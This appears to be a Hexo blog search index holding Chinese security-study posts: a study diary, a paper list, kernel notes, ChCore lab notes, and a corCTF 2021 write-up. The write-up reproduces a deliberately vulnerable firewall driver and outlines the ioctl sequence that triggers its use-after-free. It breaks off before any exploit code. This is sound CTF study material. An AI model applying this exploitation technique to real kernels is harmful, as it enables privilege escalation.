<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Emiyaのdiary</title>
    <url>/2099/06/16/Emiya%E3%81%AEdiary/</url>
    <content><![CDATA[<span id="more"></span>

<h3 id="20220502-20220508"><a href="#20220502-20220508" class="headerlink" title="20220502 - 20220508"></a>20220502 - 20220508</h3><ol>
<li><p>学习利用Hexo和github搭建博客，目前博客基本搭建完成</p>
</li>
<li><p>搭建嵌入式环境，基本完成</p>
</li>
<li><p>学习修复路由器运行环境</p>
</li>
<li><p>学习 kernel pwn 基础环境搭建知识</p>
</li>
</ol>
<h3 id="20220509-20220515"><a href="#20220509-20220515" class="headerlink" title="20220509 - 20220515"></a>20220509 - 20220515</h3><ol>
<li><p>学习 0CTF-2021-kernote， 主要思想是利用 ldt_struct 结构</p>
</li>
<li><p>学习 Linux Kernel Pwn UAF ROP ret2usr Bypass-smep</p>
</li>
<li><p>学习 Linux kernel 的启动与初始化流程</p>
</li>
</ol>
<h3 id="20220516-20220522"><a href="#20220516-20220522" class="headerlink" title="20220516 - 20220522"></a>20220516 - 20220522</h3>]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
  </entry>
  <entry>
    <title>有趣的论文列表</title>
    <url>/2022/05/28/%E6%9C%89%E8%B6%A3%E7%9A%84%E8%AE%BA%E6%96%87%E5%88%97%E8%A1%A8/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ol>
<li>2022-S&amp;P: <a href="https://www.computer.org/csdl/pds/api/csdl/proceedings/download-article/1A4Q45SVJm0/pdf">GREBE: Unveiling Exploitation Potential for Linux Kernel Bugs</a> —— 【<a href="https://github.com/Markakd/GREBE">tool-GREBE</a>】<h3 id="Vulnerability-Detection"><a href="#Vulnerability-Detection" class="headerlink" title="Vulnerability Detection"></a>Vulnerability Detection</h3></li>
</ol>
<hr>
<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="System"><a href="#System" class="headerlink" title="System"></a>System</h2><h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><ol>
<li>2022-S&amp;P：<a href="https://csdl-downloads.ieeecomputer.org/proceedings/sp/2022/1316/00/131600a542.pdf?Expires=1653707881&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9jc2RsLWRvd25sb2Fkcy5pZWVlY29tcHV0ZXIub3JnL3Byb2NlZWRpbmdzL3NwLzIwMjIvMTMxNi8wMC8xMzE2MDBhNTQyLnBkZiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY1MzcwNzg4MX19fV19&Signature=lMSIxAil3V7cRx-OpUESpb4K4Mr12Oy1xGsiIbLCmpt1srOtvaXuS5n3yjQil9iQHxK-9aOYT0iWz0j8upSJDpVD51oJX6TGghI08NIEN8wbEht1dMw6ZrKnRJbp8K4FmZuMzn12nAhq3mROXf-KQMDiCK7JXDB5YLWwomHotUlXotdveYCzSu9jwYoHHDPElCkXuFS4fZpScA43PKzHFhz8nnFFznFE4qcIE3I0zd82WfcwgYHTQQ6DzJVbJXEALEKASKCvHU0y0ARckV9ZQBZWaz3FRCRkLu6QQ~GzPIaiUo4S6ONuj5lvWDRUy5M1folnT4WeFdLwoMzHRkCyBg__&Key-Pair-Id=K12PMWTCQBDMDT">Exploit the Last Straw That Breaks Android Systems</a> —— 【<a href="https://github.com/likakn/StrawFuzzer">tool-StrawFuzzer</a>】</li>
</ol>
<hr>
<h1 id="Embeded"><a href="#Embeded" class="headerlink" title="Embeded"></a>Embeded</h1><h2 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h2><h3 id="Fuzzing-1"><a href="#Fuzzing-1" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><ol>
<li>2022-S&amp;P：<a href="https://csdl-downloads.ieeecomputer.org/proceedings/sp/2022/1316/00/131600a632.pdf?Expires=1653708149&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9jc2RsLWRvd25sb2Fkcy5pZWVlY29tcHV0ZXIub3JnL3Byb2NlZWRpbmdzL3NwLzIwMjIvMTMxNi8wMC8xMzE2MDBhNjMyLnBkZiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY1MzcwODE0OX19fV19&Signature=emhbfq0dNAfDftpnmFsjlx03Q~Ps6TKSEXkYuB5nsJnvb0iDcZaxZBRj9uxFUX~n0oLghmMCno6HEGf9C6k7LT-u5yWQmuPbbdprRRYN0d4MizyRqOt7LR5SeTWjqp3fBQ3FPtovEsNj-EPwFFrHqQcwOkMfksRl4hwJN135iBCI~Eu7W-y3JQslk4FoDQwHLxSnwo90yWkQPBrOX-jfHSXYeG4uxxe1JJjJG5u9yBP-B7UBW7eieQe27-vgpiZKtQmAJsyGwjTygdvRBH1YZ3K05V3ale~qujnrCj4a~0H9l5YQAHi6AxtKa7vRM3sppFrFAYV~A24LnKxJti8T~g__&Key-Pair-Id=K12PMWTCQBDMDT">FuzzUSB: Hybrid Stateful Fuzzing of USB Gadget Stacks</a> —— 【<a href="https://github.com/purseclab/fuzzusb">tool-FuzzUSB</a>】</li>
</ol>
<h2 id="Firmware"><a href="#Firmware" class="headerlink" title="Firmware"></a>Firmware</h2><h3 id="Study"><a href="#Study" class="headerlink" title="Study"></a>Study</h3><ol>
<li>2022-S&amp;P: <a href="https://degrigis.github.io/bins/heapster.pdf">HEAPSTER: Analyzing the Security of Dynamic Allocators for Monolithic Firmware Images</a> —— 【<a href="https://github.com/ucsb-seclab/heapster">tool-heapster</a>】</li>
</ol>
]]></content>
      <categories>
        <category>阅读笔记</category>
      </categories>
      <tags>
        <tag>推荐</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel 挖矿之旅</title>
    <url>/2022/05/13/Linux-Kernel-%E6%8C%96%E7%9F%BF%E4%B9%8B%E6%97%85/</url>
    <content><![CDATA[<blockquote>
<p>本文学习的内核版本为 5.17.7 x86</p>
</blockquote>
<h1 id="为什么要学习-Linux-Kernel"><a href="#为什么要学习-Linux-Kernel" class="headerlink" title="为什么要学习 Linux Kernel"></a>为什么要学习 Linux Kernel</h1><p>广义而言，操作系统就是一个软件，能够管理硬件和软件资源，为软件提供更好的运行环境，为硬件提供更好的访问支持</p>
<p>如果操作系统是一个软件，那么内核其实相对于操作系统而言也是操作系统，感觉有种无限套娃的感觉，但是是可以这么说的，操作系统为软件访问硬件提供服务，内核为操作系统访问硬件提供服务，所以内核是操作系统的精华所在，通过学习内核能够对操作系统拥有更深的认识</p>
<p>举个可能不是很恰当的例子，在用户层面可以通过 malloc 函数分配内存，但是内核分配的内存与用户要求的内存是否完全一致，这个就需要考虑内核的内存管理和分配策略</p>
<p>而且内核是一群极客用极端的方式压榨资源搞出来的，它包含了几乎所有能想到的方式去进行构造，以使得达到足够的性能</p>
<p>总的来说，熟悉操作系统内核能够使得在 OS-S 路上走的更远</p>
<h1 id="Linux-Kernel-启动流程"><a href="#Linux-Kernel-启动流程" class="headerlink" title="Linux Kernel 启动流程"></a>Linux Kernel 启动流程</h1><ul>
<li><a href="Linux-Kernel-%E4%B9%8B-%E5%BC%80%E5%A4%A9%E8%BE%9F%E5%9C%B0.md">Kernel 装载到内存</a></li>
<li><a href="Linux-Kernel-%E4%B9%8B-%E9%82%A3%E4%B8%80%E6%9D%9F%E5%85%89.md">Kernel 初始化到启动</a></li>
</ul>
<hr>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>Linux 内核揭秘</li>
</ul>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>corCTF 2021 利用 msg_msg 实现任意地址读写</title>
    <url>/2022/06/15/corCTF-2021-%E5%88%A9%E7%94%A8-msg-msg-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>该题目的背景是实现一个防火墙驱动，用户能够自定义规则对过滤规则进行配置</p>
<h2 id="驱动实现方法"><a href="#驱动实现方法" class="headerlink" title="驱动实现方法"></a>驱动实现方法</h2><h2 id="函数代码简要分析"><a href="#函数代码简要分析" class="headerlink" title="函数代码简要分析"></a>函数代码简要分析</h2><p>此驱动使用 5 个函数实现添加、删除、修改、复制、显示规则的功能，用户通过 ioctl cmd 与驱动进行交互</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">firewall_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">user_rule_t</span> user_rule;</span><br><span class="line">    <span class="type">rule_t</span> **firewall_rules;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;user_rule, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">user_rule_t</span>));</span><br><span class="line">    <span class="comment">// 内核数据与用户数据交互</span></span><br><span class="line">    copy_from_user((<span class="type">void</span> *)&amp;user_rule, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(<span class="type">user_rule_t</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user_rule.idx &gt;= MAX_RULES)</span><br><span class="line">    <span class="keyword">if</span> ((user_rule.type != INBOUND) &amp;&amp; (user_rule.type != OUTBOUND))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断入口或出口规则</span></span><br><span class="line">    firewall_rules = (user_rule.type == INBOUND) ? firewall_rules_in : firewall_rules_out;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> ADD_RULE:</span><br><span class="line">            ret = firewall_add_rule(user_rule, firewall_rules, user_rule.idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DELETE_RULE:</span><br><span class="line">            ret = firewall_delete_rule(user_rule, firewall_rules, user_rule.idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SHOW_RULE:</span><br><span class="line">            ret = firewall_show_rule(user_rule, firewall_rules, user_rule.idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EDIT_RULE:</span><br><span class="line">            ret = firewall_edit_rule(user_rule, firewall_rules, user_rule.idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DUP_RULE:</span><br><span class="line">            ret = firewall_dup_rule(user_rule, firewall_rules, user_rule.idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ret = ERROR;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加规则的流程为：</p>
<ol>
<li>分配 rule_t 大小的内核内存，指针填在 firewall_rules 中</li>
<li>将用户自定义规则 user_rule_t 转换成 rule_t<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">firewall_add_rule</span><span class="params">(<span class="type">user_rule_t</span> user_rule, <span class="type">rule_t</span> **firewall_rules, <span class="type">uint8_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (firewall_rules[idx] != <span class="literal">NULL</span>)</span><br><span class="line">    firewall_rules[idx] = (<span class="type">rule_t</span> *)kzalloc(<span class="keyword">sizeof</span>(<span class="type">rule_t</span>), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!firewall_rules[idx])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(firewall_rules[idx]-&gt;iface, user_rule.iface, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(firewall_rules[idx]-&gt;name, user_rule.name, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strncpy</span>(firewall_rules[idx]-&gt;desc, user_rule.desc, DESC_MAX);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in4_pton(user_rule.ip, strnlen(user_rule.ip, <span class="number">16</span>), (u8 *)&amp;(firewall_rules[idx]-&gt;ip), <span class="number">-1</span>, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in4_pton(user_rule.netmask, strnlen(user_rule.netmask, <span class="number">16</span>), (u8 *)&amp;(firewall_rules[idx]-&gt;netmask), <span class="number">-1</span>, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    firewall_rules[idx]-&gt;proto = user_rule.proto;</span><br><span class="line">    firewall_rules[idx]-&gt;port = ntohs(user_rule.port);</span><br><span class="line">    firewall_rules[idx]-&gt;action = user_rule.action;</span><br><span class="line">    firewall_rules[idx]-&gt;is_duplicated = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
删除规则的流程为：</li>
<li>释放规则所在内存</li>
<li>清空对应的规则指针<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">firewall_delete_rule</span><span class="params">(<span class="type">user_rule_t</span> user_rule, <span class="type">rule_t</span> **firewall_rules, <span class="type">uint8_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (firewall_rules[idx] == <span class="literal">NULL</span>)</span><br><span class="line"></span><br><span class="line">    kfree(firewall_rules[idx]);</span><br><span class="line">    firewall_rules[idx] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
修改规则的流程类似添加规则的流程，仅仅是少了分配内存<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">firewall_edit_rule</span><span class="params">(<span class="type">user_rule_t</span> user_rule, <span class="type">rule_t</span> **firewall_rules, <span class="type">uint8_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (firewall_rules[idx] == <span class="literal">NULL</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(firewall_rules[idx]-&gt;iface, user_rule.iface, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(firewall_rules[idx]-&gt;name, user_rule.name, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in4_pton(user_rule.ip, strnlen(user_rule.ip, <span class="number">16</span>), (u8 *)&amp;(firewall_rules[idx]-&gt;ip), <span class="number">-1</span>, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (in4_pton(user_rule.netmask, strnlen(user_rule.netmask, <span class="number">16</span>), (u8 *)&amp;(firewall_rules[idx]-&gt;netmask), <span class="number">-1</span>, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    firewall_rules[idx]-&gt;proto = user_rule.proto;</span><br><span class="line">    firewall_rules[idx]-&gt;port = ntohs(user_rule.port);</span><br><span class="line">    firewall_rules[idx]-&gt;action = user_rule.action;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
复制规则的目的主要是为了简化配置规则流程，能够快速实现入口和出口的规则复用，其流程为：</li>
<li>判断规则复用类型</li>
<li>将出入口规则指针直接复制到入出口规则指针，减少内存占用<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">firewall_dup_rule</span><span class="params">(<span class="type">user_rule_t</span> user_rule, <span class="type">rule_t</span> **firewall_rules, <span class="type">uint8_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> i;</span><br><span class="line">    <span class="type">rule_t</span> **dup;</span><br><span class="line"></span><br><span class="line">    dup = (user_rule.type == INBOUND) ? firewall_rules_out : firewall_rules_in;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (firewall_rules[idx] == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">if</span> (firewall_rules[idx]-&gt;is_duplicated)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_RULES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (dup[i] == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            dup[i] = firewall_rules[idx];</span><br><span class="line">            firewall_rules[idx]-&gt;is_duplicated = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2>由上面的函数代码的简单描述，我们可以得知虽然复用规则减少了内存占用，但是在删除规则时并为检测其复用规则，导致 UAF 利用，漏洞点形成方式：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">open(fire_driver)</span><br><span class="line">ioctl(add_cmd)</span><br><span class="line">    - IN 0 -&gt; 规则号 非实际规则指针索引</span><br><span class="line">    - OUT </span><br><span class="line">ioctl(dup_cmd)</span><br><span class="line">    - IN 0</span><br><span class="line">    - OUT 0</span><br><span class="line">ioctl(delete_cmd)</span><br><span class="line">    - IN </span><br><span class="line">    - OUT 0 -&gt; 指针依旧存在，hangling pointer</span><br><span class="line">SLAB placeholder</span><br><span class="line">ioctl(edit_cmd)</span><br><span class="line">    - IN</span><br><span class="line">    - OUT place_struct</span><br></pre></td></tr></table></figure>
查看能够复写的结构<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="type">uint32_t</span> ip;</span><br><span class="line">    <span class="type">uint32_t</span> netmask;</span><br><span class="line">    <span class="type">uint16_t</span> proto;</span><br><span class="line">    <span class="type">uint16_t</span> port;</span><br><span class="line">    <span class="type">uint8_t</span> action;</span><br><span class="line">    <span class="type">uint8_t</span> is_duplicated;</span><br><span class="line">    <span class="type">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; <span class="type">rule_t</span>;</span><br></pre></td></tr></table></figure>
<h2 id="内核-IPC-通信"><a href="#内核-IPC-通信" class="headerlink" title="内核 IPC 通信"></a>内核 IPC 通信</h2></li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>ChCore Lab3 用户进程与异常处理</title>
    <url>/2022/05/31/ChCore-Lab3-%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="实现用户进程"><a href="#实现用户进程" class="headerlink" title="实现用户进程"></a>实现用户进程</h1><h2 id="基于-Capability-的资源访问控制"><a href="#基于-Capability-的资源访问控制" class="headerlink" title="基于 Capability 的资源访问控制"></a>基于 Capability 的资源访问控制</h2><p><code>ChCore</code> 中对内核资源使用能力（<code>Capability</code>）机制进行管理，内核资源被抽象成了内核对象（kernel object），通过 <code>整型标识符</code> 对内核对象进行访问，看起来也确实可以理解为 <code>Linux文件描述符</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 系统调用创建内核对象</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_create_pmo</span><span class="params">(u64 size, u64 type)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> cap, r;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pmobject</span> *<span class="title">pmo</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    pmo = obj_alloc(TYPE_PMO, <span class="keyword">sizeof</span>(*pmo));    <span class="comment">// 构建内核对象</span></span><br><span class="line">    ...</span><br><span class="line">    pmo_init(pmo, type, size, <span class="number">0</span>);               <span class="comment">// 初始化内核对象</span></span><br><span class="line">    cap = cap_alloc(current_process, pmo, <span class="number">0</span>);   <span class="comment">// 为内核对象创建 cap 描述符</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> cap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 系统调用使用内核对象</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_map_pmo</span><span class="params">(u64 target_process_cap, u64 pmo_cap, u64 addr, u64 perm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vmspace</span> *<span class="title">vmspace</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pmobject</span> *<span class="title">pmo</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">process</span> *<span class="title">target_process</span>;</span></span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    ...</span><br><span class="line">    pmo = obj_get(current_process, pmo_cap, TYPE_PMO); <span class="comment">// 根据 cap 获取当前进程的内核对象</span></span><br><span class="line">    <span class="comment">// 将内核对象映射到其他进程</span></span><br><span class="line">    target_process = obj_get(current_process, target_process_cap,</span><br><span class="line">                    TYPE_PROCESS);</span><br><span class="line"></span><br><span class="line">    vmspace = obj_get(target_process, VMSPACE_OBJ_ID, TYPE_VMSPACE);</span><br><span class="line"></span><br><span class="line">    r = vmspace_map_range(vmspace, addr, pmo-&gt;size, perm, pmo);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_process != current_process)</span><br><span class="line">        r = cap_copy(current_process, target_process, pmo_cap, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        r = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    out_obj_put_vmspace:</span><br><span class="line">        obj_put(vmspace);</span><br><span class="line">        obj_put(target_process);</span><br><span class="line">    out_obj_put_pmo:</span><br><span class="line">        obj_put(pmo);</span><br><span class="line">    out_fail:</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h2><p>ChCore 内核使用 process 结构体表示进程信息，使用 thread 表示线程信息，一个进程是线程的集合，这些线程对特定内核对象享有相同的 Capability</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">process</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slot_table</span> <span class="title">slot_table</span>;</span> <span class="comment">// 有权访问的内核对象数组</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">thread_list</span>;</span> <span class="comment">// 所有线程列表</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slot_table</span> &#123;</span></span><br><span class="line">    <span class="comment">// 内核对象数目</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> slots_size;</span><br><span class="line">    <span class="comment">// 内核对象指针</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">object_slot</span> **<span class="title">slots</span>;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * if a bit in full_slots_bmp is 1, corresponding</span></span><br><span class="line"><span class="comment">	 * sizeof(unsigned long) bits in slots_bmp are all set</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *full_slots_bmp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *slots_bmp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">node</span>;</span>	<span class="comment">// 从属同一进程的线程链表</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_ctx</span> *<span class="title">thread_ctx</span>;</span>	<span class="comment">// 线程上下文 ？ 线程控制块</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vmspace</span> *<span class="title">vmspace</span>;</span>	<span class="comment">//虚拟地址映射空间</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">process</span> *<span class="title">process</span>;</span> <span class="comment">// 所属进程</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_ctx</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Executing Context */</span></span><br><span class="line">	<span class="type">arch_exec_cont_t</span> ec;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Thread Type */</span></span><br><span class="line">	u32 type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 执行寄存器状态</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arch_exec_cont</span> &#123;</span></span><br><span class="line">	u64 reg[REG_NUM];</span><br><span class="line">&#125; <span class="type">arch_exec_cont_t</span>;</span><br><span class="line"><span class="comment">// 进程类型</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">thread_type</span> &#123;</span></span><br><span class="line">	TYPE_IDLE = <span class="number">0</span>,</span><br><span class="line">	<span class="comment">/* ROOT thread has all cap, it is also a user thread */</span></span><br><span class="line">	TYPE_ROOT,</span><br><span class="line">	TYPE_USER,</span><br><span class="line">	TYPE_SHADOW,</span><br><span class="line">	TYPE_KERNEL,</span><br><span class="line">	TYPE_TESTS</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 寄存器类型</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">reg_type</span> &#123;</span></span><br><span class="line">	X0 = <span class="number">0</span>,			<span class="comment">/* 0x00 */</span></span><br><span class="line">	X1 = <span class="number">1</span>,			<span class="comment">/* 0x08 */</span></span><br><span class="line">	X2 = <span class="number">2</span>,			<span class="comment">/* 0x10 */</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">	X29 = <span class="number">29</span>,		<span class="comment">/* 0xe8 */</span></span><br><span class="line">	X30 = <span class="number">30</span>,		<span class="comment">/* 0xf0 */</span></span><br><span class="line">	SP_EL0 = <span class="number">31</span>,		<span class="comment">/* 0xf8 */</span></span><br><span class="line">	ELR_EL1 = <span class="number">32</span>,		<span class="comment">/* 0x100 NEXT PC */</span></span><br><span class="line">	SPSR_EL1 = <span class="number">33</span>,		<span class="comment">/* 0x108 */</span></span><br><span class="line">	TPIDR_EL0 = <span class="number">34</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="创建并执行主线程"><a href="#创建并执行主线程" class="headerlink" title="创建并执行主线程"></a>创建并执行主线程</h2><p>ChCore 中无文件系统，二进制用户程序只能采用静态连接的方式直接嵌入到内核镜像中，以便用户进程加载和运行</p>
<h3 id="用户进程创建流程"><a href="#用户进程创建流程" class="headerlink" title="用户进程创建流程"></a>用户进程创建流程</h3><p>操作系统初始化 -&gt; 调用第一行用户代码</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">start</span><br><span class="line">|</span><br><span class="line">main</span><br><span class="line">|---- uart_init</span><br><span class="line">|---- mm_init</span><br><span class="line">|---- exception_init</span><br><span class="line">|---- process_create_root       // 创建0号进程，即根进程</span><br><span class="line">|     |---- process_create      // 创建第一个用户进程</span><br><span class="line">|     |---- thread_create_main  // 创建第一个用户线程</span><br><span class="line">|---- eret_to_thread            // 返回到线程，即用户态</span><br><span class="line">|     |---- switch_context      // 切换上下文</span><br></pre></td></tr></table></figure>
<p>对函数进行逐个分析</p>
